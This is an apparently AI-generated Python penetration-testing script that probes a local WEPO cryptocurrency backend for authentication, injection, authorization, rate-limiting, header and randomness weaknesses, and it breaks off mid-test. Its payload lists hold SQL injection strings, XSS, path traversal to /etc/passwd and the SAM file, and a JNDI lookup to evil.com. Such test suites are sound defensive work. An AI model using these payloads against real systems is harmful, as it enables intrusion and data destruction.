#!/usr/bin/env python3
"""
WEPO CRYPTOCURRENCY BACKEND COMPREHENSIVE SECURITY AUDIT & PENETRATION TESTING SUITE

**COMPREHENSIVE SECURITY AUDIT SCOPE:**

**Phase 1: Authentication & Session Security**
- Test wallet login endpoints for brute force vulnerabilities
- Analyze session management and token security
- Check password hashing and storage mechanisms
- Test authentication bypass attempts
- Verify session timeout and secure storage
- Test JWT/token validation and expiration

**Phase 2: API Security Testing** 
- Test all API endpoints for SQL/NoSQL injection
- Check authorization mechanisms and bypass attempts
- Test rate limiting effectiveness on critical endpoints
- Analyze input validation and sanitization
- Test for XSS, CSRF vulnerabilities
- Check HTTP security headers and configurations
- Test API enumeration and information disclosure

**Phase 3: Cryptographic Security**
- Verify Dilithium2 quantum-resistant implementation integrity
- Test BIP-39 seed phrase generation entropy and randomness
- Analyze private key storage and encryption methods
- Verify zk-STARK privacy proofs implementation
- Test hash function security (Argon2, SHA-256)
- Check random number generation quality

**Phase 4: Blockchain & Consensus Security**
- Test consensus mechanism vulnerabilities
- Analyze transaction verification integrity
- Check double-spending prevention mechanisms
- Test block validation security
- Verify masternode security implementations
- Check staking vulnerabilities

**Phase 5: Data Storage & Privacy**
- Test database security and encryption
- Check for sensitive data exposure in logs/responses
- Analyze Quantum Vault privacy protections
- Test Ghost Transfer privacy mechanisms
- Verify privacy mixing service security

**SPECIFIC ENDPOINTS TO AUDIT:**
- /api/wallet/* (creation, login, transactions)
- /api/mining/* (mining coordination, rewards)
- /api/vault/* (quantum vault operations)
- /api/rwa/* (real world assets)
- /api/staking/* (proof of stake)
- /api/masternode/* (masternode services)
- /api/btc-mixing/* (privacy mixing)

**SECURITY TESTING METHODOLOGY:**
Using penetration testing techniques including:
- Authentication bypass attempts
- Injection testing (SQL, NoSQL, Command)
- Authorization testing
- Input fuzzing
- Cryptographic analysis
- Session manipulation
- Rate limiting testing
- Error handling analysis

Security findings will be categorized as: Critical, High, Medium, Low
"""

import requests
import json
import time
import uuid
import os
import sys
import secrets
from datetime import datetime, timedelta
import random
import string
import base64
import hashlib
import re
import threading
from concurrent.futures import ThreadPoolExecutor
import urllib.parse

# Use preview backend URL from frontend/.env
BACKEND_URL = "http://127.0.0.1:18021"
API_URL = f"{BACKEND_URL}/api"

print(f"🔒 WEPO CRYPTOCURRENCY BACKEND COMPREHENSIVE SECURITY AUDIT & PENETRATION TESTING")
print(f"Preview Backend API URL: {API_URL}")
print(f"Focus: Comprehensive security audit and penetration testing of WEPO backend systems")
print("=" * 100)

# Security audit results tracking
security_audit_results = {
    "total_tests": 0,
    "passed_tests": 0,
    "failed_tests": 0,
    "vulnerabilities": {
        "critical": [],
        "high": [],
        "medium": [],
        "low": []
    },
    "tests": []
}

def log_security_test(name, passed, severity="medium", vulnerability_details=None, response=None, error=None, details=None):
    """Log security test results with vulnerability tracking"""
    status = "✅ SECURE" if passed else "🚨 VULNERABLE"
    print(f"{status} {name}")
    
    if details:
        print(f"  Details: {details}")
    
    if error:
        print(f"  Error: {error}")
    
    if vulnerability_details and not passed:
        print(f"  🚨 VULNERABILITY: {vulnerability_details}")
        security_audit_results["vulnerabilities"][severity].append({
            "test": name,
            "details": vulnerability_details,
            "severity": severity,
            "timestamp": datetime.now().isoformat()
        })
    
    if response and not passed:
        print(f"  Response: {str(response)[:200]}...")
    
    security_audit_results["total_tests"] += 1
    if passed:
        security_audit_results["passed_tests"] += 1
    else:
        security_audit_results["failed_tests"] += 1
    
    security_audit_results["tests"].append({
        "name": name,
        "passed": passed,
        "severity": severity,
        "vulnerability_details": vulnerability_details,
        "error": error,
        "details": details,
        "timestamp": datetime.now().isoformat()
    })

def generate_realistic_test_data():
    """Generate realistic test data for security testing"""
    return {
        "username": f"security_test_{secrets.token_hex(4)}",
        "password": f"SecurePass{random.randint(1000, 9999)}!",
        "address": f"wepo1{secrets.token_hex(16)}",
        "encrypted_private_key": base64.b64encode(secrets.token_bytes(32)).decode()
    }

# ===== PHASE 1: AUTHENTICATION & SESSION SECURITY =====

def test_authentication_brute_force_protection():
    """Test wallet login endpoints for brute force vulnerabilities"""
    print("\n🔐 PHASE 1.1: AUTHENTICATION BRUTE FORCE PROTECTION TESTING")
    print("Testing wallet login endpoints for brute force vulnerabilities...")
    
    try:
        # Create a test wallet first
        test_wallet = generate_realistic_test_data()
        create_response = requests.post(f"{API_URL}/wallet/create", json=test_wallet)
        
        if create_response.status_code != 200:
            log_security_test("Authentication Brute Force Protection", False, "high",
                            "Cannot create test wallet for brute force testing", 
                            error=f"Wallet creation failed: {create_response.status_code}")
            return False
        
        # Test brute force protection
        failed_attempts = 0
        max_attempts = 10
        
        for i in range(max_attempts):
            wrong_password = f"WrongPassword{i}"
            login_data = {
                "username": test_wallet["username"],
                "password": wrong_password
            }
            
            response = requests.post(f"{API_URL}/wallet/login", json=login_data)
            
            if response.status_code == 401:
                failed_attempts += 1
            elif response.status_code == 429:  # Rate limited
                log_security_test("Authentication Brute Force Protection", True, "low",
                                details=f"Rate limiting detected after {i+1} attempts")
                return True
            elif response.status_code == 423:  # Account locked
                log_security_test("Authentication Brute Force Protection", True, "low",
                                details=f"Account lockout detected after {i+1} attempts")
                return True
        
        # If we made it through all attempts without rate limiting
        if failed_attempts == max_attempts:
            log_security_test("Authentication Brute Force Protection", False, "high",
                            f"No brute force protection detected - {max_attempts} failed attempts allowed")
            return False
        else:
            log_security_test("Authentication Brute Force Protection", True, "low",
                            details=f"Some protection mechanisms may be in place")
            return True
            
    except Exception as e:
        log_security_test("Authentication Brute Force Protection", False, "medium",
                        "Error during brute force testing", error=str(e))
        return False

def test_session_management_security():
    """Test session management and token security"""
    print("\n🔐 PHASE 1.2: SESSION MANAGEMENT SECURITY TESTING")
    print("Testing session management and token security...")
    
    try:
        # Create and login to test wallet
        test_wallet = generate_realistic_test_data()
        create_response = requests.post(f"{API_URL}/wallet/create", json=test_wallet)
        
        if create_response.status_code != 200:
            log_security_test("Session Management Security", False, "medium",
                            "Cannot create test wallet for session testing")
            return False
        
        # Test login
        login_data = {
            "username": test_wallet["username"],
            "password": test_wallet["password"]
        }
        login_response = requests.post(f"{API_URL}/wallet/login", json=login_data)
        
        if login_response.status_code == 200:
            # Check for session tokens or cookies
            session_indicators = []
            
            # Check response headers for session management
            if 'set-cookie' in login_response.headers:
                session_indicators.append("HTTP cookies")
            
            # Check response body for tokens
            try:
                login_data = login_response.json()
                if any(key in login_data for key in ['token', 'jwt', 'session_id', 'access_token']):
                    session_indicators.append("Response tokens")
            except:
                pass
            
            # Check for secure cookie attributes
            secure_attributes = []
            if 'set-cookie' in login_response.headers:
                cookie_header = login_response.headers['set-cookie']
                if 'Secure' in cookie_header:
                    secure_attributes.append("Secure")
                if 'HttpOnly' in cookie_header:
                    secure_attributes.append("HttpOnly")
                if 'SameSite' in cookie_header:
                    secure_attributes.append("SameSite")
            
            if session_indicators:
                if secure_attributes:
                    log_security_test("Session Management Security", True, "low",
                                    details=f"Session management detected: {', '.join(session_indicators)} with {', '.join(secure_attributes)}")
                else:
                    log_security_test("Session Management Security", False, "medium",
                                    f"Session management detected but missing security attributes: {', '.join(session_indicators)}")
            else:
                log_security_test("Session Management Security", False, "low",
                                "No obvious session management detected - may be stateless")
            
            return len(session_indicators) > 0
        else:
            log_security_test("Session Management Security", False, "medium",
                            "Cannot test session management - login failed")
            return False
            
    except Exception as e:
        log_security_test("Session Management Security", False, "medium",
                        "Error during session management testing", error=str(e))
        return False

def test_password_security():
    """Test password hashing and storage mechanisms"""
    print("\n🔐 PHASE 1.3: PASSWORD SECURITY TESTING")
    print("Testing password hashing and storage mechanisms...")
    
    try:
        # Test password complexity requirements
        weak_passwords = [
            "123456",
            "password",
            "abc123",
            "qwerty",
            "admin"
        ]
        
        weak_password_rejected = 0
        for weak_pass in weak_passwords:
            test_data = generate_realistic_test_data()
            test_data["password"] = weak_pass
            
            response = requests.post(f"{API_URL}/wallet/create", json=test_data)
            if response.status_code in [400, 422]:  # Should reject weak passwords
                weak_password_rejected += 1
        
        # Test if passwords are stored securely (not in plaintext)
        test_wallet = generate_realistic_test_data()
        create_response = requests.post(f"{API_URL}/wallet/create", json=test_wallet)
        
        password_security_score = 0
        
        if weak_password_rejected >= 3:  # At least 3/5 weak passwords rejected
            password_security_score += 1
            print(f"  ✅ Password complexity: {weak_password_rejected}/5 weak passwords rejected")
        else:
            print(f"  🚨 Password complexity: Only {weak_password_rejected}/5 weak passwords rejected")
        
        if create_response.status_code == 200:
            # Check if password appears in response (should not)
            response_text = create_response.text.lower()
            if test_wallet["password"].lower() not in response_text:
                password_security_score += 1
                print(f"  ✅ Password exposure: Password not found in response")
            else:
                print(f"  🚨 Password exposure: Password found in response - potential plaintext storage")
            
            # Test wallet retrieval doesn't expose password
            wallet_address = create_response.json().get('address')
            if wallet_address:
                get_response = requests.get(f"{API_URL}/wallet/{wallet_address}")
                if get_response.status_code == 200:
                    get_response_text = get_response.text.lower()
                    if test_wallet["password"].lower() not in get_response_text:
                        password_security_score += 1
                        print(f"  ✅ Password retrieval: Password not exposed in wallet data")
                    else:
                        print(f"  🚨 Password retrieval: Password exposed in wallet data")
        
        if password_security_score >= 2:
            log_security_test("Password Security", True, "low",
                            details=f"Password security checks passed: {password_security_score}/3")
            return True
        else:
            log_security_test("Password Security", False, "high",
                            f"Password security vulnerabilities detected: {password_security_score}/3 checks passed")
            return False
            
    except Exception as e:
        log_security_test("Password Security", False, "medium",
                        "Error during password security testing", error=str(e))
        return False

# ===== PHASE 2: API SECURITY TESTING =====

def test_sql_injection_vulnerabilities():
    """Test all API endpoints for SQL/NoSQL injection"""
    print("\n🔐 PHASE 2.1: SQL/NOSQL INJECTION TESTING")
    print("Testing API endpoints for injection vulnerabilities...")
    
    try:
        # Common injection payloads
        injection_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM users --",
            "admin'--",
            "' OR 1=1#",
            "$ne",
            "{'$gt':''}",
            "'; return true; //",
            "1' OR '1'='1' /*",
            "' OR 'x'='x"
        ]
        
        # Test endpoints with injection payloads
        test_endpoints = [
            ("/wallet/create", "POST", {"username": "PAYLOAD", "password": "test", "address": "wepo1test", "encrypted_private_key": "test"}),
            ("/wallet/login", "POST", {"username": "PAYLOAD", "password": "test"}),
            ("/wallet/PAYLOAD", "GET", None),
            ("/network/status", "GET", None)
        ]
        
        injection_vulnerabilities = 0
        total_injection_tests = 0
        
        for endpoint, method, base_data in test_endpoints:
            for payload in injection_payloads[:5]:  # Test first 5 payloads per endpoint
                total_injection_tests += 1
                
                try:
                    if method == "POST" and base_data:
                        # Replace PAYLOAD in data
                        test_data = base_data.copy()
                        for key, value in test_data.items():
                            if value == "PAYLOAD":
                                test_data[key] = payload
                        
                        response = requests.post(f"{API_URL}{endpoint}", json=test_data, timeout=5)
                    elif method == "GET":
                        # Replace PAYLOAD in URL
                        test_url = endpoint.replace("PAYLOAD", urllib.parse.quote(payload))
                        response = requests.get(f"{API_URL}{test_url}", timeout=5)
                    else:
                        continue
                    
                    # Check for injection vulnerability indicators
                    if response.status_code == 200:
                        response_text = response.text.lower()
                        vulnerability_indicators = [
                            "syntax error",
                            "mysql",
                            "postgresql",
                            "mongodb",
                            "sql error",
                            "database error",
                            "ora-",
                            "sqlite",
                            "column",
                            "table"
                        ]
                        
                        if any(indicator in response_text for indicator in vulnerability_indicators):
                            injection_vulnerabilities += 1
                            print(f"  🚨 Potential injection vulnerability: {endpoint} with payload: {payload[:20]}...")
                            break
                
                except requests.exceptions.Timeout:
                    # Timeout might indicate successful injection causing delay
                    injection_vulnerabilities += 1
                    print(f"  🚨 Potential injection vulnerability (timeout): {endpoint} with payload: {payload[:20]}...")
                    break
                except Exception:
                    continue
        
        if injection_vulnerabilities == 0:
            log_security_test("SQL/NoSQL Injection", True, "low",
                            details=f"No injection vulnerabilities detected in {total_injection_tests} tests")
            return True
        else:
            log_security_test("SQL/NoSQL Injection", False, "critical",
                            f"Potential injection vulnerabilities detected: {injection_vulnerabilities} out of {total_injection_tests} tests")
            return False
            
    except Exception as e:
        log_security_test("SQL/NoSQL Injection", False, "medium",
                        "Error during injection testing", error=str(e))
        return False

def test_authorization_bypass():
    """Test authorization mechanisms and bypass attempts"""
    print("\n🔐 PHASE 2.2: AUTHORIZATION BYPASS TESTING")
    print("Testing authorization mechanisms and bypass attempts...")
    
    try:
        # Create two test wallets
        wallet1 = generate_realistic_test_data()
        wallet2 = generate_realistic_test_data()
        
        create1 = requests.post(f"{API_URL}/wallet/create", json=wallet1)
        create2 = requests.post(f"{API_URL}/wallet/create", json=wallet2)
        
        if create1.status_code != 200 or create2.status_code != 200:
            log_security_test("Authorization Bypass", False, "medium",
                            "Cannot create test wallets for authorization testing")
            return False
        
        address1 = create1.json().get('address')
        address2 = create2.json().get('address')
        
        authorization_tests_passed = 0
        total_auth_tests = 0
        
        # Test 1: Try to access wallet1 data without authentication
        total_auth_tests += 1
        response = requests.get(f"{API_URL}/wallet/{address1}")
        if response.status_code in [401, 403]:
            authorization_tests_passed += 1
            print(f"  ✅ Wallet access control: Unauthenticated access properly blocked")
        elif response.status_code == 200:
            print(f"  🚨 Wallet access control: Unauthenticated access allowed")
        else:
            print(f"  ⚠️ Wallet access control: Unexpected response {response.status_code}")
        
        # Test 2: Try to access wallet1 transactions without authentication
        total_auth_tests += 1
        response = requests.get(f"{API_URL}/wallet/{address1}/transactions")
        if response.status_code in [401, 403]:
            authorization_tests_passed += 1
            print(f"  ✅ Transaction access control: Unauthenticated access properly blocked")
        elif response.status_code == 200:
            print(f"  🚨 Transaction access control: Unauthenticated access allowed")
        else:
            print(f"  ⚠️ Transaction access control: Unexpected response {response.status_code}")
        
        # Test 3: Try to send transaction without proper authentication
        total_auth_tests += 1
        fake_transaction = {
            "from_address": address1,
            "to_address": address2,
            "amount": 1.0,
            "password_hash": "fake_hash"
        }
        response = requests.post(f"{API_URL}/transaction/send", json=fake_transaction)
        if response.status_code in [401, 403, 404]:
            authorization_tests_passed += 1
            print(f"  ✅ Transaction authorization: Unauthorized transaction properly blocked")
        elif response.status_code == 200:
            print(f"  🚨 Transaction authorization: Unauthorized transaction allowed")
        else:
            print(f"  ⚠️ Transaction authorization: Unexpected response {response.status_code}")
        
        # Test 4: Try parameter manipulation to access other user's data
        total_auth_tests += 1
        # Try to access wallet2 data by manipulating parameters
        response = requests.get(f"{API_URL}/wallet/{address2}")
        if response.status_code in [401, 403]:
            authorization_tests_passed += 1
            print(f"  ✅ Parameter manipulation: Cross-user access properly blocked")
        elif response.status_code == 200:
            # This might be expected behavior if no authentication is required
            print(f"  ⚠️ Parameter manipulation: Cross-user access allowed (may be by design)")
            authorization_tests_passed += 0.5  # Partial credit
        else:
            print(f"  ⚠️ Parameter manipulation: Unexpected response {response.status_code}")
        
        success_rate = authorization_tests_passed / total_auth_tests
        if success_rate >= 0.75:  # At least 75% of tests should pass
            log_security_test("Authorization Bypass", True, "low",
                            details=f"Authorization controls working: {authorization_tests_passed}/{total_auth_tests} tests passed")
            return True
        else:
            log_security_test("Authorization Bypass", False, "high",
                            f"Authorization vulnerabilities detected: {authorization_tests_passed}/{total_auth_tests} tests passed")
            return False
            
    except Exception as e:
        log_security_test("Authorization Bypass", False, "medium",
                        "Error during authorization testing", error=str(e))
        return False

def test_rate_limiting():
    """Test rate limiting effectiveness on critical endpoints"""
    print("\n🔐 PHASE 2.3: RATE LIMITING TESTING")
    print("Testing rate limiting effectiveness on critical endpoints...")
    
    try:
        # Test rate limiting on wallet creation endpoint
        rate_limit_detected = False
        requests_made = 0
        max_requests = 20
        
        start_time = time.time()
        
        for i in range(max_requests):
            test_data = generate_realistic_test_data()
            response = requests.post(f"{API_URL}/wallet/create", json=test_data)
            requests_made += 1
            
            if response.status_code == 429:  # Too Many Requests
                rate_limit_detected = True
                print(f"  ✅ Rate limiting: Detected after {requests_made} requests")
                break
            elif response.status_code == 503:  # Service Unavailable
                rate_limit_detected = True
                print(f"  ✅ Rate limiting: Service protection after {requests_made} requests")
                break
            
            # Small delay to avoid overwhelming the server
            time.sleep(0.1)
        
        elapsed_time = time.time() - start_time
        requests_per_second = requests_made / elapsed_time
        
        # Test rate limiting on login endpoint
        login_rate_limit_detected = False
        login_requests_made = 0
        
        test_wallet = generate_realistic_test_data()
        requests.post(f"{API_URL}/wallet/create", json=test_wallet)  # Create wallet first
        
        for i in range(15):
            login_data = {
                "username": test_wallet["username"],
                "password": "wrong_password"
            }
            response = requests.post(f"{API_URL}/wallet/login", json=login_data)
            login_requests_made += 1
            
            if response.status_code in [429, 423]:  # Rate limited or account locked
                login_rate_limit_detected = True
                print(f"  ✅ Login rate limiting: Detected after {login_requests_made} attempts")
                break
            
            time.sleep(0.1)
        
        # Evaluate rate limiting effectiveness
        rate_limiting_score = 0
        
        if rate_limit_detected:
            rate_limiting_score += 1
        
        if login_rate_limit_detected:
            rate_limiting_score += 1
        
        if requests_per_second < 50:  # Reasonable rate limit
            rate_limiting_score += 1
            print(f"  ✅ Request rate: {requests_per_second:.1f} requests/second (reasonable)")
        else:
            print(f"  🚨 Request rate: {requests_per_second:.1f} requests/second (too high)")
        
        if rate_limiting_score >= 2:
            log_security_test("Rate Limiting", True, "low",
                            details=f"Rate limiting mechanisms detected: {rate_limiting_score}/3 checks passed")
            return True
        else:
            log_security_test("Rate Limiting", False, "medium",
                            f"Insufficient rate limiting protection: {rate_limiting_score}/3 checks passed")
            return False
            
    except Exception as e:
        log_security_test("Rate Limiting", False, "medium",
                        "Error during rate limiting testing", error=str(e))
        return False

def test_input_validation():
    """Test input validation and sanitization"""
    print("\n🔐 PHASE 2.4: INPUT VALIDATION TESTING")
    print("Testing input validation and sanitization...")
    
    try:
        # Test various malicious inputs
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "../../etc/passwd",
            "../../../windows/system32/config/sam",
            "'; DROP TABLE users; --",
            "${jndi:ldap://evil.com/a}",
            "{{7*7}}",
            "<%=7*7%>",
            "\x00\x01\x02\x03",
            "A" * 10000,  # Very long input
            "🚨💀🔥",  # Unicode/emoji
            "null",
            "undefined",
            "NaN",
            "Infinity"
        ]
        
        validation_tests_passed = 0
        total_validation_tests = 0
        
        # Test wallet creation with malicious inputs
        for malicious_input in malicious_inputs[:10]:  # Test first 10 inputs
            total_validation_tests += 1
            
            test_data = {
                "username": malicious_input,
                "password": "ValidPassword123!",
                "address": f"wepo1{secrets.token_hex(16)}",
                "encrypted_private_key": base64.b64encode(b"test").decode()
            }
            
            response = requests.post(f"{API_URL}/wallet/create", json=test_data)
            
            # Check if malicious input is properly handled
            if response.status_code in [400, 422]:  # Bad request - input rejected
                validation_tests_passed += 1
                print(f"  ✅ Input validation: Malicious input rejected: {malicious_input[:20]}...")
            elif response.status_code == 200:
                # Check if the malicious input was sanitized in the response
                response_text = response.text
                if malicious_input not in response_text:
                    validation_tests_passed += 0.5  # Partial credit for sanitization
                    print(f"  ⚠️ Input validation: Input accepted but sanitized: {malicious_input[:20]}...")
                else:
                    print(f"  🚨 Input validation: Malicious input accepted and reflected: {malicious_input[:20]}...")
            else:
                print(f"  ⚠️ Input validation: Unexpected response {response.status_code} for: {malicious_input[:20]}...")
        
        # Test numeric input validation
        total_validation_tests += 1
        invalid_numeric_data = {
            "from_address": "wepo1test",
            "to_address": "wepo1test2",
            "amount": "not_a_number",
            "password_hash": "test"
        }
        
        response = requests.post(f"{API_URL}/transaction/send", json=invalid_numeric_data)
        if response.status_code in [400, 422]:
            validation_tests_passed += 1
            print(f"  ✅ Numeric validation: Invalid numeric input properly rejected")
        else:
            print(f"  🚨 Numeric validation: Invalid numeric input accepted")
        
        # Test required field validation
        total_validation_tests += 1
        incomplete_data = {
            "username": "test_user"
            # Missing required fields
        }
        
        response = requests.post(f"{API_URL}/wallet/create", json=incomplete_data)
        if response.status_code in [400, 422]:
            validation_tests_passed += 1
            print(f"  ✅ Required field validation: Incomplete data properly rejected")
        else:
            print(f"  🚨 Required field validation: Incomplete data accepted")
        
        success_rate = validation_tests_passed / total_validation_tests
        if success_rate >= 0.7:  # At least 70% should pass
            log_security_test("Input Validation", True, "low",
                            details=f"Input validation working: {validation_tests_passed}/{total_validation_tests} tests passed")
            return True
        else:
            log_security_test("Input Validation", False, "high",
                            f"Input validation vulnerabilities: {validation_tests_passed}/{total_validation_tests} tests passed")
            return False
            
    except Exception as e:
        log_security_test("Input Validation", False, "medium",
                        "Error during input validation testing", error=str(e))
        return False

def test_http_security_headers():
    """Test HTTP security headers and configurations"""
    print("\n🔐 PHASE 2.5: HTTP SECURITY HEADERS TESTING")
    print("Testing HTTP security headers and configurations...")
    
    try:
        # Test main API endpoint for security headers
        response = requests.get(f"{API_URL}/")
        
        security_headers = {
            'X-Content-Type-Options': 'nosniff',
            'X-Frame-Options': ['DENY', 'SAMEORIGIN'],
            'X-XSS-Protection': '1; mode=block',
            'Strict-Transport-Security': 'max-age=',
            'Content-Security-Policy': 'default-src',
            'Referrer-Policy': ['no-referrer', 'strict-origin'],
            'Permissions-Policy': 'geolocation=',
        }
        
        headers_present = 0
        total_headers = len(security_headers)
        
        for header, expected_values in security_headers.items():
            if header in response.headers:
                header_value = response.headers[header]
                
                if isinstance(expected_values, list):
                    if any(expected in header_value for expected in expected_values):
                        headers_present += 1
                        print(f"  ✅ {header}: {header_value}")
                    else:
                        print(f"  🚨 {header}: Present but weak value: {header_value}")
                else:
                    if expected_values in header_value:
                        headers_present += 1
                        print(f"  ✅ {header}: {header_value}")
                    else:
                        print(f"  🚨 {header}: Present but weak value: {header_value}")
            else:
                print(f"  ❌ {header}: Missing")
        
        # Test HTTPS enforcement
        https_score = 0
        if BACKEND_URL.startswith('https://'):
            https_score += 1
            print(f"  ✅ HTTPS: API served over HTTPS")
        else:
            print(f"  🚨 HTTPS: API not served over HTTPS")
        
        # Test for information disclosure in headers
        info_disclosure_score = 1  # Start with 1, deduct for issues
        sensitive_headers = ['Server', 'X-Powered-By', 'X-AspNet-Version']
        
        for sensitive_header in sensitive_headers:
            if sensitive_header in response.headers:
                info_disclosure_score -= 0.3
                print(f"  🚨 Information disclosure: {sensitive_header}: {response.headers[sensitive_header]}")
        
        if info_disclosure_score >= 0.7:
            print(f"  ✅ Information disclosure: Minimal server information exposed")
        
        total_score = headers_present + https_score + max(0, info_disclosure_score)
        max_score = total_headers + 2  # headers + https + info disclosure
        
        if total_score >= max_score * 0.6:  # At least 60% of security measures
            log_security_test("HTTP Security Headers", True, "low",
                            details=f"HTTP security measures: {total_score:.1f}/{max_score} checks passed")
            return True
        else:
            log_security_test("HTTP Security Headers", False, "medium",
                            f"Insufficient HTTP security measures: {total_score:.1f}/{max_score} checks passed")
            return False
            
    except Exception as e:
        log_security_test("HTTP Security Headers", False, "medium",
                        "Error during HTTP security headers testing", error=str(e))
        return False

# ===== PHASE 3: CRYPTOGRAPHIC SECURITY =====

def test_dilithium2_implementation():
    """Test Dilithium2 quantum-resistant implementation integrity"""
    print("\n🔐 PHASE 3.1: DILITHIUM2 QUANTUM-RESISTANT IMPLEMENTATION TESTING")
    print("Testing Dilithium2 quantum-resistant implementation integrity...")
    
    try:
        # Test network status for quantum resistance information
        response = requests.get(f"{API_URL}/network/status")
        
        if response.status_code != 200:
            log_security_test("Dilithium2 Implementation", False, "high",
                            "Cannot access network status to verify quantum resistance")
            return False
        
        network_data = response.json()
        
        # Look for quantum resistance indicators
        quantum_indicators = 0
        
        # Check if quantum resistance is mentioned in any API responses
        test_wallet = generate_realistic_test_data()
        wallet_response = requests.post(f"{API_URL}/wallet/create", json=test_wallet)
        
        if wallet_response.status_code == 200:
            wallet_data = wallet_response.json()
            
            # Check for quantum-resistant address generation
            address = wallet_data.get('address', '')
            if address.startswith('wepo1') and len(address) >= 37:
                quantum_indicators += 1
                print(f"  ✅ Address format: Quantum-resistant address format detected")
            
            # Check for BIP-39 implementation (part of quantum-resistant setup)
            if wallet_data.get('bip39') == True:
                quantum_indicators += 1
                print(f"  ✅ BIP-39: Quantum-resistant seed generation detected")
        
        # Test mining info for quantum-resistant algorithm
        mining_response = requests.get(f"{API_URL}/mining/info")
        if mining_response.status_code == 200:
            mining_data = mining_response.json()
            algorithm = mining_data.get('algorithm', '').lower()
            
            if 'argon2' in algorithm or 'quantum' in algorithm:
                quantum_indicators += 1
                print(f"  ✅ Mining algorithm: Quantum-resistant algorithm detected: {algorithm}")
            else:
                print(f"  ⚠️ Mining algorithm: Algorithm may not be quantum-resistant: {algorithm}")
        
        # Test for cryptographic strength indicators
        if quantum_indicators >= 2:
            log_security_test("Dilithium2 Implementation", True, "low",
                            details=f"Quantum resistance indicators found: {quantum_indicators}/3")
            return True
        else:
            log_security_test("Dilithium2 Implementation", False, "high",
                            f"Insufficient quantum resistance indicators: {quantum_indicators}/3")
            return False
            
    except Exception as e:
        log_security_test("Dilithium2 Implementation", False, "medium",
                        "Error during Dilithium2 testing", error=str(e))
        return False

def test_random_number_generation():
    """Test random number generation quality"""
    print("\n🔐 PHASE 3.2: RANDOM NUMBER GENERATION TESTING")
    print("Testing random number generation quality...")
    
    try:
        # Generate multiple wallets to test randomness
        generated_addresses = []
        
        for i in range(20):
            test_wallet = generate_realistic_test_data()
            response = requests.post(f"{API_URL}/wallet/create", json=test_wallet)
            
            if response.status_code == 200:
                data = response.json()
                if data.get('address'):
                    generated_addresses.append(data['address'])
        
        if len(generated_addresses) < 15:
            log_security_test("Random Number Generation", False, "medium",
                            "Insufficient addresses generated for randomness testing")
            return False
        
        randomness_score = 0
        
        # Test 1: Uniqueness
        unique_addresses = len(set(generated_addresses))
        uniqueness_rate = unique_addresses / len(generated_addresses)
        
        if uniqueness_rate >= 0.95:
            randomness_score += 1
            print(f"  ✅ Uniqueness: {unique_addresses}/{len(generated_addresses)} addresses unique ({uniqueness_rate:.1%})")
        else:
            print(f"  🚨 Uniqueness: Only {unique_addresses}/{len(generated_addresses)} addresses unique ({uniqueness_rate:.1%})")
        
        # Test 2: Character distribution
        all_hex_chars = ''.join(addr[5:] for addr in generated_addresses)  # Skip 'wepo1' prefix
        char_counts = {}
        
        for char in '0123456789abcdef':
            char_counts[char] = all_hex_chars.count(char)
        
        total_chars = len(all_hex_chars)
        expected_per_char = total_chars / 16
        
        # Check if distribution is reasonably uniform
        uniform_chars = sum(1 for count in char_counts.values() 
                          if abs(count - expected_per_char) < expected_per_char * 0.3)
        
        if uniform_chars >= 12:  # At least 12/16 chars should be reasonably distributed
            randomness_score += 1
            print(f"  ✅ Character distribution: {uniform_chars}/16 characters uniformly distributed")
        else:
            print(f"  🚨 Character distribution: Only {uniform_chars}/16 characters uniformly distributed")
        
        # Test 3: Pattern detection
        patterns_found = 0
        for addr in generated_addresses:
            hex_part = addr[5:]
            
            # Check for obvious patterns
            if (len(set(hex_part)) < 8 or  # Too few unique characters
                hex_part.count('0') > len(hex_part) * 0.4 or  # Too many zeros
                hex_part.count('f') > len(hex_part) * 0.4):   # Too many f's
                patterns_found += 1
        
        pattern_rate = patterns_found / len(generated_addresses)
        if pattern_rate < 0.1:  # Less than 10% should have obvious patterns
            randomness_score += 1
            print(f"  ✅ Pattern detection: {patterns_found}/{len(generated_addresses)} addresses with patterns ({pattern_rate:.1%})")
        else:
            print(f"  🚨 Pattern detection: {patterns_found}/{len(generated_addresses)} addresses with patterns ({pattern_rate:.1%})")
        
        if randomness_score >= 2:
            log_security_test("Random Number Generation", True, "low",
                            details=f"Random number generation quality: {randomness_score}/3 tests passed")
            return True
        else:
            log_security_test("Random Number Generation", False, "high",
                            f"Poor random number generation quality: {randomness_score}/3 tests passed")
            return False
            
    except Exception as e:
        log_security_test("Random Number Generation", False, "medium",
                        "Error during random number generation testing", error=str(e))
        return False

# ===== PHASE 4: BLOCKCHAIN & CONSENSUS SECURITY =====

def test_transaction_verification():
    """Test transaction verification integrity"""
    print("\n🔐 PHASE 4.1: TRANSACTION VERIFICATION TESTING")
    print("Testing transaction verification integrity...")
    
    try:
        # Create test wallets
        wallet1 = generate_realistic_test_data()
        wallet2 = generate_realistic_test_data()
        
        create1 = requests.post(f"{API_URL}/wallet/create", json=wallet1)
        create2 = requests.post(f"{API_URL}/wallet/create", json=wallet2)
        
        if create1.status_code != 200 or create2.status_code != 200:
            log_security_test("Transaction Verification", False, "medium",
                            "Cannot create test wallets for transaction testing")
            return False
        
        address1 = create1.json().get('address')
        address2 = create2.json().get('address')
        
        verification_tests_passed = 0
        total_verification_tests = 0
        
        # Test 1: Invalid transaction data
        total_verification_tests += 1
        invalid_transaction = {
            "from_address": "invalid_address",
            "to_address": address2,
            "amount": 100.0,
            "password_hash": "fake_hash"
        }
        
        response = requests.post(f"{API_URL}/transaction/send", json=invalid_transaction)
        if response.status_code in [400, 404, 422]:
            verification_tests_passed += 1
            print(f"  ✅ Invalid address: Transaction with invalid address properly rejected")
        else:
            print(f"  🚨 Invalid address: Transaction with invalid address accepted")
        
        # Test 2: Negative amount transaction
        total_verification_tests += 1
        negative_transaction = {
            "from_address": address1,
            "to_address": address2,
            "amount": -10.0,
            "password_hash": "fake_hash"
        }
        
        response = requests.post(f"{API_URL}/transaction/send", json=negative_transaction)
        if response.status_code in [400, 422]:
            verification_tests_passed += 1
            print(f"  ✅ Negative amount: Transaction with negative amount properly rejected")
        else:
            print(f"  🚨 Negative amount: Transaction with negative amount accepted")
        
        # Test 3: Zero amount transaction
        total_verification_tests += 1
        zero_transaction = {
            "from_address": address1,
            "to_address": address2,
            "amount": 0.0,
            "password_hash": "fake_hash"
        }
        
        response = requests.post(f"{API_URL}/transaction/send", json=zero_transaction)
        if response.status_code in [400, 422]:
            verification_tests_passed += 1
            print(f"  ✅ Zero amount: Transaction with zero amount properly rejected")
        else:
